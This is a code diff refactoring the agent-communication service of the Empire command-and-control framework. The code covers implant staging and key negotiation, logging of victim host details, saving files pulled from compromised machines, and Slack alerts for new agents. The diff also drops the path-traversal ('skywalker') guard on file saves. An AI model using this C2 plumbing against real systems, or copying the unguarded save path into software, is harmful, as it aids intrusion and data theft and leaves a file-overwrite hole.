@@ -1,83 +1,38 @@
-"""
-
-Main agent handling functionality for Empire.
-
-The Agents() class in instantiated in ./server.py by the main menu and includes:
-
-    is_agent_present()          - returns True if an agent is present in the self.agents cache
-    add_agent()                 - adds an agent to the self.agents cache and the backend database
-    remove_agent_db()           - removes an agent from the self.agents cache and the backend database
-    is_ip_allowed()             - checks if a supplied IP is allowed as per the whitelist/blacklist
-    save_file()                 - saves a file download for an agent to the appropriately constructed path.
-    save_module_file()          - saves a module output file to the appropriate path
-    save_agent_log()            - saves the agent console output to the agent's log file
-    is_agent_elevated()         - checks whether a specific sessionID is currently elevated
-    get_agents_db()             - returns all active agents from the database
-    get_agent_nonce_db()        - returns the nonce for this sessionID
-    get_language_db()           - returns the language used by this agent
-    get_agent_id_db()           - returns an agent sessionID based on the name
-    get_agents_for_listener()   - returns all agent objects linked to a given listener name
-    get_autoruns_db()           - returns any global script autoruns
-    update_agent_sysinfo_db()   - updates agent system information in the database
-    update_agent_lastseen_db()  - updates the agent's last seen timestamp in the database
-    set_autoruns_db()           - sets the global script autorun in the config in the database
-    clear_autoruns_db()         - clears the currently set global script autoruns in the config in the database
-    handle_agent_staging()      - handles agent staging neogotiation
-    handle_agent_data()         - takes raw agent data and processes it appropriately.
-    handle_agent_request()      - return any encrypted tasks for the particular agent
-    handle_agent_response()     - parses agent raw replies into structures
-    process_agent_packet()      - processes agent reply structures appropriately
-
-handle_agent_data() is the main function that should be used by external listener modules
-
-Most methods utilize self.lock to deal with the concurreny issue of kicking off threaded listeners.
-
-"""
 import base64
 import json
 import logging
 import os
-import queue
 import string
 import threading
-import time
-import warnings
+import typing
+from contextlib import suppress
 
-from sqlalchemy import and_, or_
+from sqlalchemy import and_
 from sqlalchemy.orm import Session
 from zlib_wrapper import decompress
 
 from empire.server.api.v2.credential.credential_dto import CredentialPostRequest
-from empire.server.common.helpers import KThread
-from empire.server.common.socks import create_client, start_client
+from empire.server.common import encryption, helpers, packets
 from empire.server.core.config import empire_config
 from empire.server.core.db import models
 from empire.server.core.db.base import SessionLocal
 from empire.server.core.db.models import AgentTaskStatus
 from empire.server.core.hooks import hooks
-from empire.server.utils import datetime_util
 
-from . import encryption, helpers, packets
+if typing.TYPE_CHECKING:
+    from empire.server.common.empire import MainMenu
+
 
 log = logging.getLogger(__name__)
 
 
-class Agents:
-    """
-    Main class that contains agent communication functionality, including key
-    negotiation in process_get() and process_post().
-
-    For managing agents use core/agent_service.py.
-    """
-
-    def __init__(self, MainMenu, args=None):
-        # pull out the controller objects
-        self.mainMenu = MainMenu
-        self.installPath = self.mainMenu.installPath
-        self.args = args
-        self.socksthread = {}
-        self.socksqueue = {}
-        self.socksclient = {}
+class AgentCommunicationService:
+    def __init__(self, main_menu: "MainMenu"):
+        self.main_menu = main_menu
+        self.agent_service = main_menu.agentsv2
+        self.agent_task_service = main_menu.agenttasksv2
+        self.agent_socks_service = main_menu.agentsocksv2
+        self.credential_service = main_menu.credentialsv2
 
         # internal agent dictionary for the client's session key, funcions, and URI sets
         #   this is done to prevent database reads for extremely common tasks (like checking tasking URI existence)
@@ -86,135 +41,23 @@ class Agents:
         #                               'functions' : [tab-completable function names for a script-import]
         #                            }
         self.agents = {}
+        self._lock = threading.Lock()
 
-        # used to protect self.agents and self.mainMenu.conn during threaded listener access
-        self.lock = threading.Lock()
+        with SessionLocal() as db:
+            db_agents = self.agent_service.get_all(db)
+            for agent in db_agents:
+                self._add_agent_to_cache(agent)
 
-        # Since each agent logs to a different file, we can have multiple locks to reduce
-        #  waiting time when writing to the file.
-        self.agent_log_locks: dict[str, threading.Lock] = {}
+            config = db.query(models.Config).first()
+            self.ipWhiteList = config.ip_whitelist
+            self.ipBlackList = config.ip_blacklist
 
-        # reinitialize any agents that already exist in the database
-        db_agents = self.get_agents_db()
-        for agent in db_agents:
-            agentInfo = {
-                "sessionKey": agent.session_key,
-                "language": agent.language,
-                "functions": agent.functions,
-            }
-            self.agents[agent["session_id"]] = agentInfo
-
-        # pull out common configs from the main menu object in server.py
-        self.ipWhiteList = self.mainMenu.ipWhiteList
-        self.ipBlackList = self.mainMenu.ipBlackList
-
-    ###############################################################
-    #
-    # Misc agent methods
-    #
-    ###############################################################
-
-    @staticmethod
-    def get_agent_from_name_or_session_id(agent_name, db: Session):
-        return (
-            db.query(models.Agent)
-            .filter(
-                or_(
-                    models.Agent.name == agent_name,
-                    models.Agent.session_id == agent_name,
-                )
-            )
-            .first()
-        )
-
-    def is_agent_present(self, sessionID):
-        """
-        Checks if a given sessionID corresponds to an active agent.
-        """
-        warnings.warn(
-            "This has been deprecated and may be removed."
-            "Use agent_service.get_by_id() or agent_service.get_by_name() instead.",
-            DeprecationWarning,
-            stacklevel=2,
-        )
-        return sessionID in self.agents
-
-    def add_agent(
-        self,
-        sessionID,
-        externalIP,
-        delay,
-        jitter,
-        profile,
-        killDate,
-        workingHours,
-        lostLimit,
-        sessionKey=None,
-        nonce="",
-        listener="",
-        language="",
-        db=None,
-    ):
-        """
-        Add an agent to the internal cache and database.
-        """
-        # generate a new key for this agent if one wasn't supplied
-        if not sessionKey:
-            sessionKey = encryption.generate_aes_key()
-
-        if not profile or profile == "":
-            profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
-
-        # add the agent
-        agent = models.Agent(
-            name=sessionID,
-            session_id=sessionID,
-            delay=delay,
-            jitter=jitter,
-            external_ip=externalIP,
-            session_key=sessionKey,
-            nonce=nonce,
-            profile=profile,
-            kill_date=killDate,
-            working_hours=workingHours,
-            lost_limit=lostLimit,
-            listener=listener,
-            language=language.lower(),
-            archived=False,
-        )
-
-        db.add(agent)
-        self.update_agent_lastseen_db(sessionID, db)
-        db.flush()
-
-        message = f"New agent {sessionID} checked in"
-        log.info(message)
-
-        # initialize the tasking/result buffers along with the client session key
-        self.agents[sessionID] = {
-            "sessionKey": sessionKey,
-            "language": agent.language.lower(),
-            "functions": [],
+    def _add_agent_to_cache(self, agent: models.Agent):
+        self.agents[agent.session_id] = {
+            "sessionKey": agent.session_key,
+            "language": agent.language,
+            "functions": agent.functions,
         }
-
-        return agent
-
-    def remove_agent_db(self, session_id, db: Session):
-        """
-        Remove an agent to the internal cache and database.
-        """
-        # remove the agent from the internal cache
-        self.agents.pop(session_id, None)
-
-        # remove the agent from the database
-        agent = (
-            db.query(models.Agent).filter(models.Agent.session_id == session_id).first()
-        )
-        if agent:
-            db.delete(agent)
-
-        message = f"Agent {session_id} deleted"
-        log.info(message)
 
     def is_ip_allowed(self, ip_address):
         """
@@ -236,15 +79,31 @@ class Agents:
         else:
             return True
 
+    def _decompress_python_data(self, data, filename, session_id):
+        log.info(
+            f"Compressed size of {filename} download: {helpers.get_file_size(data)}"
+        )
+
+        d = decompress.decompress()
+        dec_data = d.dec_data(data)
+        log.info(
+            f"Final size of {filename} wrote: {helpers.get_file_size(dec_data['data'])}"
+        )
+        if not dec_data["crc32_check"]:
+            message = f"File agent {session_id} failed crc32 check during decompression!\n[!] HEADER: Start crc32: {dec_data['header_crc32']} -- Received crc32: {dec_data['dec_crc32']} -- Crc32 pass: {dec_data['crc32_check']}!"
+            log.warning(message)
+        data = dec_data["data"]
+        return data
+
     def save_file(
         self,
-        sessionID,
+        db: Session,
+        session_id,
         path,
         data,
-        filesize,
+        total_filesize,
         tasking: models.AgentTask,
         language: str,
-        db: Session,
         append=False,
     ):
         """
@@ -255,23 +114,11 @@ class Agents:
 
         # construct the appropriate save path
         download_dir = empire_config.directories.downloads
-        save_path = download_dir / sessionID / "/".join(parts[0:-1])
+        save_path = download_dir / session_id / "/".join(parts[0:-1])
         filename = os.path.basename(parts[-1])
         save_file = save_path / filename
 
-        try:
-            self.lock.acquire()
-            # fix for 'skywalker' exploit by @zeroSteiner
-            # I'm not really sure if this can actually still be exploited, its gone through
-            # quite a few refactors. But we'll keep it for now.
-            safe_path = download_dir.absolute()
-            if not str(save_file.absolute()).startswith(str(safe_path)):
-                message = "Agent {} attempted skywalker exploit! Attempted overwrite of {} with data {}".format(
-                    sessionID, path, data
-                )
-                log.warning(message)
-                return
-
+        with self._lock:
             # make the recursive directory structure if it doesn't already exist
             if not save_path.exists():
                 os.makedirs(save_path)
@@ -281,18 +128,7 @@ class Agents:
             f = save_file.open(mode)
 
             if "python" in language:
-                log.info(
-                    f"Compressed size of {filename} download: {helpers.get_file_size(data)}"
-                )
-                d = decompress.decompress()
-                dec_data = d.dec_data(data)
-                log.info(
-                    f"Final size of {filename} wrote: {helpers.get_file_size(dec_data['data'])}"
-                )
-                if not dec_data["crc32_check"]:
-                    message = f"File agent {sessionID} failed crc32 check during decompression!\n[!] HEADER: Start crc32: {dec_data['header_crc32']} -- Received crc32: {dec_data['dec_crc32']} -- Crc32 pass: {dec_data['crc32_check']}!"
-                    log.warning(message)
-                data = dec_data["data"]
+                data = self._decompress_python_data(data, filename, session_id)
 
             f.write(data)
             f.close()
@@ -316,7 +152,7 @@ class Agents:
                     .filter(
                         and_(
                             models.AgentFile.path == path,
-                            models.AgentFile.session_id == sessionID,
+                            models.AgentFile.session_id == session_id,
                         )
                     )
                     .first()
@@ -325,19 +161,16 @@ class Agents:
                 if agent_file:
                     agent_file.downloads.append(download)
                     db.flush()
-        finally:
-            self.lock.release()
 
         percent = round(
-            int(os.path.getsize(str(save_file))) / int(filesize) * 100,
+            int(os.path.getsize(str(save_file))) / int(total_filesize) * 100,
             2,
         )
 
-        # notify everyone that the file was downloaded
-        message = f"Part of file {filename} from {sessionID} saved [{percent}%] to {save_path}"
+        message = f"Part of file {filename} from {session_id} saved [{percent}%] to {save_path}"
         log.info(message)
 
-    def save_module_file(self, sessionID, path, data, language: str):
+    def save_module_file(self, session_id, path, data, language: str):
         """
         Save a module output file to the appropriate path.
         """
@@ -345,39 +178,15 @@ class Agents:
 
         # construct the appropriate save path
         download_dir = empire_config.directories.downloads
-        save_path = download_dir / sessionID / "/".join(parts[0:-1])
+        save_path = download_dir / session_id / "/".join(parts[0:-1])
         filename = parts[-1]
         save_file = save_path / filename
 
         # decompress data if coming from a python agent:
         if "python" in language:
-            log.info(
-                f"Compressed size of {filename} download: {helpers.get_file_size(data)}"
-            )
-            d = decompress.decompress()
-            dec_data = d.dec_data(data)
-            log.info(
-                f"Final size of {filename} wrote: {helpers.get_file_size(dec_data['data'])}"
-            )
-            if not dec_data["crc32_check"]:
-                message = f"File agent {sessionID} failed crc32 check during decompression!\n[!] HEADER: Start crc32: {dec_data['header_crc32']} -- Received crc32: {dec_data['dec_crc32']} -- Crc32 pass: {dec_data['crc32_check']}!"
-                log.warning(message)
-            data = dec_data["data"]
+            data = self._decompress_python_data(data, filename, session_id)
 
-        try:
-            self.lock.acquire()
-            safe_path = download_dir.absolute()
-
-            # fix for 'skywalker' exploit by @zeroSteiner
-            # I'm not really sure if this can actually still be exploited, its gone through
-            # quite a few refactors. But we'll keep it for now.
-            if not str(save_file.absolute()).startswith(str(safe_path)):
-                message = "agent {} attempted skywalker exploit!\n[!] attempted overwrite of {} with data {}".format(
-                    sessionID, path, data
-                )
-                log.warning(message)
-                return
-
+        with self._lock:
             # make the recursive directory structure if it doesn't already exist
             if not save_path.exists():
                 os.makedirs(save_path)
@@ -386,187 +195,37 @@ class Agents:
 
             with save_file.open("wb") as f:
                 f.write(data)
-        finally:
-            self.lock.release()
 
         # notify everyone that the file was downloaded
-        message = f"File {path} from {sessionID} saved"
+        message = f"File {path} from {session_id} saved"
         log.info(message)
 
         return str(save_file)
 
-    def save_agent_log(self, session_id, data):
+    def _remove_agent(self, db: Session, session_id: str):
         """
-        Save the agent console output to the agent's log file.
+        Remove an agent to the internal cache and database.
+        We don't hard delete agents for the most part. this is only
+        used when the initial agent setup fails.
         """
-        if isinstance(data, bytes):
-            data = data.decode("UTF-8")
+        self.agents.pop(session_id, None)
 
-        save_path = empire_config.directories.downloads / session_id
-
-        # make the recursive directory structure if it doesn't already exist
-        if not save_path.exists():
-            os.makedirs(save_path)
-
-        current_time = helpers.get_datetime()
-
-        if session_id not in self.agent_log_locks:
-            self.agent_log_locks[session_id] = threading.Lock()
-        lock = self.agent_log_locks[session_id]
-
-        with lock:
-            with open(f"{save_path}/agent.log", "a") as f:
-                f.write("\n" + current_time + " : " + "\n")
-                f.write(data + "\n")
-
-    ###############################################################
-    #
-    # Methods to get information from agent fields.
-    #
-    ###############################################################
-
-    def is_agent_elevated(self, session_id):
-        """
-        Check whether a specific sessionID is currently elevated.
-        This means root for OS X/Linux and high integrity for Windows.
-        """
-        warnings.warn(
-            "This has been deprecated and may be removed."
-            "Use agent_service.get_by_id() or agent_service.get_by_name() instead.",
-            DeprecationWarning,
-            stacklevel=2,
+        agent = (
+            db.query(models.Agent).filter(models.Agent.session_id == session_id).first()
         )
-        with SessionLocal() as db:
-            elevated = (
-                db.query(models.Agent.high_integrity)
-                .filter(models.Agent.session_id == session_id)
-                .scalar()
-            )
+        if agent:
+            db.delete(agent)
 
-            return elevated is True
+        message = f"Agent {session_id} deleted"
+        log.info(message)
 
-    def get_agents_db(self):
-        """
-        Return all active agents from the database.
-        """
-        with SessionLocal() as db:
-            results = db.query(models.Agent).all()
-
-        return results
-
-    def get_agent_nonce_db(self, session_id, db: Session):
-        """
-        Return the nonce for this sessionID.
-        """
-        warnings.warn(
-            "This has been deprecated and may be removed."
-            "Use agent_service.get_by_id() or agent_service.get_by_name() instead.",
-            DeprecationWarning,
-            stacklevel=2,
-        )
-        nonce = (
-            db.query(models.Agent.nonce)
-            .filter(models.Agent.session_id == session_id)
-            .first()
-        )
-
-        if nonce and nonce is not None:
-            if isinstance(nonce, str):
-                return nonce
-            else:
-                return nonce[0]
-
-    def get_language_db(self, session_id):
-        """
-        Return the language used by this agent.
-        """
-        warnings.warn(
-            "This has been deprecated and may be removed."
-            "Use agent_service.get_by_id() or agent_service.get_by_name() instead.",
-            DeprecationWarning,
-            stacklevel=2,
-        )
-        with SessionLocal() as db:
-            # see if we were passed a name instead of an ID
-            name_id = self.get_agent_id_db(session_id, db)
-            if name_id:
-                session_id = name_id
-
-            language = (
-                db.query(models.Agent.language)
-                .filter(models.Agent.session_id == session_id)
-                .scalar()
-            )
-
-        return language
-
-    def get_agent_id_db(self, name, db: Session = None):
-        """
-        Get an agent sessionID based on the name.
-
-        """
-        warnings.warn(
-            "This has been deprecated and may be removed."
-            "Use agent_service.get_by_id() or agent_service.get_by_name() instead.",
-            DeprecationWarning,
-            stacklevel=2,
-        )
-        # db is optional for backwards compatibility until this function is phased out
-        with db or SessionLocal() as db:
-            agent = db.query(models.Agent).filter(models.Agent.name == name).first()
+    def _get_agent_nonce(self, db: Session, session_id: str):
+        agent = self.agent_service.get_by_id(db, session_id)
 
         if agent:
-            return agent.session_id
+            return agent.nonce
 
-        return None
-
-    def get_agents_for_listener(self, listener_name):
-        """
-        Return agent objects linked to a given listener name.
-        """
-        warnings.warn(
-            "This has been deprecated and may be removed."
-            "Use agent_service.get_by_id() or agent_service.get_by_name() instead.",
-            DeprecationWarning,
-            stacklevel=2,
-        )
-        with SessionLocal() as db:
-            agents = (
-                db.query(models.Agent.session_id)
-                .filter(models.Agent.listener == listener_name)
-                .all()
-            )
-
-            return [a[0] for a in agents]
-
-    def get_autoruns_db(self):
-        """
-        Return any global script autoruns.
-        """
-        warnings.warn(
-            "This has been deprecated and may be removed."
-            "Use agent_service.get_by_id() or agent_service.get_by_name() instead.",
-            DeprecationWarning,
-            stacklevel=2,
-        )
-        with SessionLocal() as db:
-            results = db.query(models.Config.autorun_command).all()
-            if results[0].autorun_command:
-                autorun_command = results[0].autorun_command
-            else:
-                autorun_command = ""
-
-            results = db.query(models.Config.autorun_data).all()
-            if results[0].autorun_data:
-                autorun_data = results[0].autorun_data
-            else:
-                autorun_data = ""
-
-            autoruns = [autorun_command, autorun_data]
-
-        return autoruns
-
-    def update_dir_list(self, session_id, response, db: Session):
+    def _update_dir_list(self, db: Session, session_id: str, response):
         """ "
         Update the directory list
         """
@@ -618,9 +277,10 @@ class Agents:
                     )
                 )
 
-    def update_agent_sysinfo_db(
+    # TODO listener and external_ip not used?
+    def update_agent_sysinfo(
         self,
-        db,
+        db: Session,
         session_id,
         listener="",
         external_ip="",
@@ -690,65 +350,9 @@ class Agents:
         agent.architecture = architecture
         db.flush()
 
-    def update_agent_lastseen_db(self, session_id, db: Session):
-        """
-        Update the agent's last seen timestamp in the database.
-
-        This checks to see if a timestamp already exists for the agent and ignores
-        it if it does. It is not super efficient to check the database on every checkin.
-        A better alternative would be to find a way to configure sqlalchemy to ignore
-        duplicate inserts or do upserts.
-        """
-        checkin_time = datetime_util.getutcnow().replace(microsecond=0)
-        exists = (
-            db.query(models.AgentCheckIn)
-            .filter(
-                and_(
-                    models.AgentCheckIn.agent_id == session_id,
-                    models.AgentCheckIn.checkin_time == checkin_time,
-                )
-            )
-            .first()
-        )
-        if not exists:
-            db.add(models.AgentCheckIn(agent_id=session_id, checkin_time=checkin_time))
-
-    def set_autoruns_db(self, task_command, module_data):
-        """
-        Set the global script autorun in the config in the database.
-        """
-        warnings.warn(
-            "This has been deprecated and may be removed."
-            "Use agent_service.get_by_id() or agent_service.get_by_name() instead.",
-            DeprecationWarning,
-            stacklevel=2,
-        )
-        try:
-            with SessionLocal.begin() as db:
-                config = db.query(models.Config).first()
-                config.autorun_command = task_command
-                config.autorun_data = module_data
-        except Exception:
-            log.error(
-                "script autoruns not a database field, run --reset to reset DB schema."
-            )
-            log.warning("this will reset ALL agent connections!")
-
-    def clear_autoruns_db(self):
-        """
-        Clear the currently set global script autoruns in the config in the database.
-        """
-        with SessionLocal.begin() as db:
-            config = db.query(models.Config).first()
-            config.autorun_command = ""
-            config.autorun_data = ""
-
-    ###############################################################
-    #
-    # Agent tasking methods
-    #
-    ###############################################################
-    def get_queued_agent_tasks_db(self, session_id, db: Session):
+    def _get_queued_agent_tasks(
+        self, db: Session, session_id
+    ) -> list[models.AgentTask]:
         """
         Retrieve tasks that have been queued for our agent from the database.
         Set them to 'pulled'.
@@ -756,64 +360,55 @@ class Agents:
         if session_id not in self.agents:
             log.error(f"Agent {session_id} not active.")
             return []
-        else:
-            try:
-                tasks, total = self.mainMenu.agenttasksv2.get_tasks(
-                    db=db,
-                    agents=[session_id],
-                    include_full_input=True,
-                    status=AgentTaskStatus.queued,
-                )
 
-                for task in tasks:
-                    task.status = AgentTaskStatus.pulled
+        try:
+            tasks, total = self.agent_task_service.get_tasks(
+                db=db,
+                agents=[session_id],
+                include_full_input=True,
+                status=AgentTaskStatus.queued,
+            )
 
-                return tasks
-            except AttributeError:
-                log.warning("Agent checkin during initialization.")
-                return []
+            for task in tasks:
+                task.status = AgentTaskStatus.pulled
 
-    def get_queued_agent_temporary_tasks(self, session_id):
+            return tasks
+        except AttributeError:
+            log.warning("Agent checkin during initialization.")
+            return []
+
+    def _get_queued_agent_temporary_tasks(self, session_id):
         """
-        Retrieve temporary tasks that have been queued for our agent from the agenttasksv2.
+        Retrieve temporary tasks that have been queued for our agent
         """
         if session_id not in self.agents:
             log.error(f"Agent {session_id} not active.")
             return []
-        else:
-            try:
-                tasks = self.mainMenu.agenttasksv2.get_temporary_tasks_for_agent(
-                    session_id
-                )
-                return tasks
-            except AttributeError:
-                log.warning("Agent checkin during initialization.")
-                return []
 
-    ###############################################################
-    #
-    # Agent staging/data processing components
-    #
-    ###############################################################
+        try:
+            tasks = self.agent_task_service.get_temporary_tasks_for_agent(session_id)
+            return tasks
+        except AttributeError:
+            log.warning("Agent checkin during initialization.")
+            return []
 
-    def handle_agent_staging(
+    def _handle_agent_staging(
         self,
-        sessionID,
+        db: Session,
+        session_id,
         language,
         meta,
         additional,
-        encData,
-        stagingKey,
-        listenerOptions,
-        clientIP="0.0.0.0",
-        db: Session = None,
+        enc_data,
+        staging_key,
+        listener_options,
+        client_ip="0.0.0.0",
     ):
         """
         Handles agent staging/key-negotiation.
-        TODO: does this function need self.lock?
         """
 
-        listenerName = listenerOptions["Name"]["Value"]
+        listenerName = listener_options["Name"]["Value"]
 
         if meta == "STAGE0":
             # step 1 of negotiation -> client requests staging code
@@ -821,15 +416,15 @@ class Agents:
 
         elif meta == "STAGE1":
             # step 3 of negotiation -> client posts public key
-            message = f"Agent {sessionID} from {clientIP} posted public key"
+            message = f"Agent {session_id} from {client_ip} posted public key"
             log.info(message)
 
             # decrypt the agent's public key
             try:
-                message = encryption.aes_decrypt_and_verify(stagingKey, encData)
+                message = encryption.aes_decrypt_and_verify(staging_key, enc_data)
             except Exception:
                 # if we have an error during decryption
-                message = f"HMAC verification failed from '{sessionID}'"
+                message = f"HMAC verification failed from '{session_id}'"
                 log.error(message, exc_info=True)
                 return "ERROR: HMAC verification failed"
 
@@ -841,7 +436,7 @@ class Agents:
 
                 # client posts RSA key
                 if (len(message) < 400) or (not message.endswith("</RSAKeyValue>")):
-                    message = f"Invalid PowerShell key post format from {sessionID}"
+                    message = f"Invalid PowerShell key post format from {session_id}"
                     log.error(message)
                     return "ERROR: Invalid PowerShell key post format"
                 else:
@@ -849,21 +444,22 @@ class Agents:
                     rsa_key = encryption.rsa_xml_to_key(message)
 
                     if rsa_key:
-                        message = f"Agent {sessionID} from {clientIP} posted valid PowerShell RSA key"
+                        message = f"Agent {session_id} from {client_ip} posted valid PowerShell RSA key"
                         log.info(message)
 
                         nonce = helpers.random_string(16, charset=string.digits)
-                        delay = listenerOptions["DefaultDelay"]["Value"]
-                        jitter = listenerOptions["DefaultJitter"]["Value"]
-                        profile = listenerOptions["DefaultProfile"]["Value"]
-                        killDate = listenerOptions["KillDate"]["Value"]
-                        workingHours = listenerOptions["WorkingHours"]["Value"]
-                        lostLimit = listenerOptions["DefaultLostLimit"]["Value"]
+                        delay = listener_options["DefaultDelay"]["Value"]
+                        jitter = listener_options["DefaultJitter"]["Value"]
+                        profile = listener_options["DefaultProfile"]["Value"]
+                        killDate = listener_options["KillDate"]["Value"]
+                        workingHours = listener_options["WorkingHours"]["Value"]
+                        lostLimit = listener_options["DefaultLostLimit"]["Value"]
 
                         # add the agent to the database now that it's "checked in"
-                        agent = self.add_agent(
-                            sessionID,
-                            clientIP,
+                        agent = self.agent_service.create_agent(
+                            db,
+                            session_id,
+                            client_ip,
                             delay,
                             jitter,
                             profile,
@@ -872,8 +468,8 @@ class Agents:
                             lostLimit,
                             nonce=nonce,
                             listener=listenerName,
-                            db=db,
                         )
+                        self._add_agent_to_cache(agent)
 
                         client_session_key = agent.session_key
                         data = f"{nonce}{client_session_key}"
@@ -887,20 +483,20 @@ class Agents:
                         return encrypted_msg
 
                     else:
-                        message = f"Agent {sessionID} returned an invalid PowerShell public key!"
+                        message = f"Agent {session_id} returned an invalid PowerShell public key!"
                         log.error(message)
                         return "ERROR: Invalid PowerShell public key"
 
             elif language.lower() == "python":
                 if (len(message) < 1000) or (len(message) > 2500):
-                    message = f"Invalid Python key post format from {sessionID}"
+                    message = f"Invalid Python key post format from {session_id}"
                     log.error(message)
-                    return "Error: Invalid Python key post format from %s" % (sessionID)
+                    return f"Error: Invalid Python key post format from {session_id}"
                 else:
                     try:
                         int(message)
                     except Exception:
-                        message = f"Invalid Python key post format from {sessionID}"
+                        message = f"Invalid Python key post format from {session_id}"
                         log.error(message)
                         return message
 
@@ -912,84 +508,82 @@ class Agents:
 
                     nonce = helpers.random_string(16, charset=string.digits)
 
-                    message = (
-                        f"Agent {sessionID} from {clientIP} posted valid Python PUB key"
-                    )
+                    message = f"Agent {session_id} from {client_ip} posted valid Python PUB key"
                     log.info(message)
 
-                    delay = listenerOptions["DefaultDelay"]["Value"]
-                    jitter = listenerOptions["DefaultJitter"]["Value"]
-                    profile = listenerOptions["DefaultProfile"]["Value"]
-                    killDate = listenerOptions["KillDate"]["Value"]
-                    workingHours = listenerOptions["WorkingHours"]["Value"]
-                    lostLimit = listenerOptions["DefaultLostLimit"]["Value"]
+                    delay = listener_options["DefaultDelay"]["Value"]
+                    jitter = listener_options["DefaultJitter"]["Value"]
+                    profile = listener_options["DefaultProfile"]["Value"]
+                    killDate = listener_options["KillDate"]["Value"]
+                    workingHours = listener_options["WorkingHours"]["Value"]
+                    lostLimit = listener_options["DefaultLostLimit"]["Value"]
 
                     # add the agent to the database now that it's "checked in"
-                    self.add_agent(
-                        sessionID,
-                        clientIP,
+                    agent = self.agent_service.create_agent(
+                        db,
+                        session_id,
+                        client_ip,
                         delay,
                         jitter,
                         profile,
                         killDate,
                         workingHours,
                         lostLimit,
-                        sessionKey=serverPub.key.hex(),
+                        session_key=serverPub.key.hex(),
                         nonce=nonce,
                         listener=listenerName,
                         language=language,
-                        db=db,
                     )
+                    self._add_agent_to_cache(agent)
 
                     # step 4 of negotiation -> server returns HMAC(AESn(nonce+PUBs))
                     data = f"{nonce}{serverPub.publicKey}"
-                    encrypted_msg = encryption.aes_encrypt_then_hmac(stagingKey, data)
+                    encrypted_msg = encryption.aes_encrypt_then_hmac(staging_key, data)
                     # TODO: wrap this in a routing packet?
 
                     return encrypted_msg
 
             else:
-                message = f"Agent {sessionID} from {clientIP} using an invalid language specification: {language}"
+                message = f"Agent {session_id} from {client_ip} using an invalid language specification: {language}"
                 log.info(message)
                 return f"ERROR: invalid language: {language}"
 
         elif meta == "STAGE2":
             # step 5 of negotiation -> client posts nonce+sysinfo and requests agent
             try:
-                session_key = self.agents[sessionID]["sessionKey"]
+                session_key = self.agents[session_id]["sessionKey"]
                 if isinstance(session_key, str):
                     if language == "PYTHON":
                         session_key = bytes.fromhex(session_key)
                     else:
-                        session_key = (self.agents[sessionID]["sessionKey"]).encode(
+                        session_key = (self.agents[session_id]["sessionKey"]).encode(
                             "UTF-8"
                         )
 
-                message = encryption.aes_decrypt_and_verify(session_key, encData)
+                message = encryption.aes_decrypt_and_verify(session_key, enc_data)
                 parts = message.split(b"|")
 
                 if len(parts) < 12:
-                    message = f"Agent {sessionID} posted invalid sysinfo checkin format: {message}"
+                    message = f"Agent {session_id} posted invalid sysinfo checkin format: {message}"
                     log.info(message)
                     # remove the agent from the cache/database
-                    self.remove_agent_db(sessionID, db)
+                    self._remove_agent(db, session_id)
                     return message
 
-                # verify the nonce
-                if int(parts[0]) != (int(self.get_agent_nonce_db(sessionID, db)) + 1):
-                    message = f"Invalid nonce returned from {sessionID}"
+                if int(parts[0]) != (int(self._get_agent_nonce(db, session_id)) + 1):
+                    message = f"Invalid nonce returned from {session_id}"
                     log.error(message)
-                    self.remove_agent_db(sessionID, db)
-                    return f"ERROR: Invalid nonce returned from {sessionID}"
+                    self._remove_agent(db, session_id)
+                    return f"ERROR: Invalid nonce returned from {session_id}"
 
-                message = f"Nonce verified: agent {sessionID} posted valid sysinfo checkin format: {message}"
+                message = f"Nonce verified: agent {session_id} posted valid sysinfo checkin format: {message}"
                 log.debug(message)
 
                 _listener = str(parts[1], "utf-8")
                 domainname = str(parts[2], "utf-8")
                 username = str(parts[3], "utf-8")
                 hostname = str(parts[4], "utf-8")
-                external_ip = clientIP
+                external_ip = client_ip
                 internal_ip = str(parts[5], "utf-8")
                 os_details = str(parts[6], "utf-8")
                 high_integrity = str(parts[7], "utf-8")
@@ -1005,19 +599,19 @@ class Agents:
 
             except Exception as e:
                 message = (
-                    f"Exception in agents.handle_agent_staging() for {sessionID} : {e}"
+                    f"Exception in agents.handle_agent_staging() for {session_id} : {e}"
                 )
                 log.error(message, exc_info=True)
-                self.remove_agent_db(sessionID, db)
-                return f"Error: Exception in agents.handle_agent_staging() for {sessionID} : {e}"
+                self._remove_agent(db, session_id)
+                return f"Error: Exception in agents.handle_agent_staging() for {session_id} : {e}"
 
             if domainname and domainname.strip() != "":
                 username = f"{domainname}\\{username}"
 
             # update the agent with this new information
-            self.update_agent_sysinfo_db(
+            self.update_agent_sysinfo(
                 db,
-                sessionID,
+                session_id,
                 listener=listenerName,
                 internal_ip=internal_ip,
                 username=username,
@@ -1033,7 +627,7 @@ class Agents:
 
             # signal to Slack that this agent is now active
 
-            slack_webhook_url = listenerOptions["SlackURL"]["Value"]
+            slack_webhook_url = listener_options["SlackURL"]["Value"]
             if slack_webhook_url != "":
                 slack_text = ":biohazard_sign: NEW AGENT :biohazard_sign:\r\n```Machine Name: {}\r\nInternal IP: {}\r\nExternal IP: {}\r\nUser: {}\r\nOS Version: {}\r\nAgent ID: {}```".format(
                     hostname,
@@ -1041,61 +635,36 @@ class Agents:
                     external_ip,
                     username,
                     os_details,
-                    sessionID,
+                    session_id,
                 )
                 helpers.slackMessage(slack_webhook_url, slack_text)
 
             # signal everyone that this agent is now active
-            message = f"Initial agent {sessionID} from {clientIP} now active (Slack)"
+            message = f"Initial agent {session_id} from {client_ip} now active (Slack)"
             log.info(message)
 
             hooks.run_hooks(
                 hooks.AFTER_AGENT_CHECKIN_HOOK,
                 db,
-                self.get_agent_from_name_or_session_id(sessionID, db),
+                self.agent_service.get_by_id(db, session_id),
             )
 
             # save the initial sysinfo information in the agent log
-            output = f"Agent {sessionID} now active"
-            self.save_agent_log(sessionID, output)
+            output = f"Agent {session_id} now active"
+            self.agent_service.save_agent_log(session_id, output)
 
-            # if a script autorun is set, set that as the agent's first tasking
-            # TODO VR autoruns haven't really worked in a while anyway...
-            #  Would be nice to reintroduce it, but it's a little tricky in the
-            #  multi-user architecture.
-            # autorun = self.get_autoruns_db()
-            # if autorun and autorun[0] != "" and autorun[1] != "":
-            #     self.add_agent_task_db(sessionID, autorun[0], autorun[1])
-            #
-            # if (
-            #     language.lower() in self.mainMenu.autoRuns
-            #     and len(self.mainMenu.autoRuns[language.lower()]) > 0
-            # ):
-            #     autorunCmds = ["interact %s" % sessionID]
-            #     autorunCmds.extend(self.mainMenu.autoRuns[language.lower()])
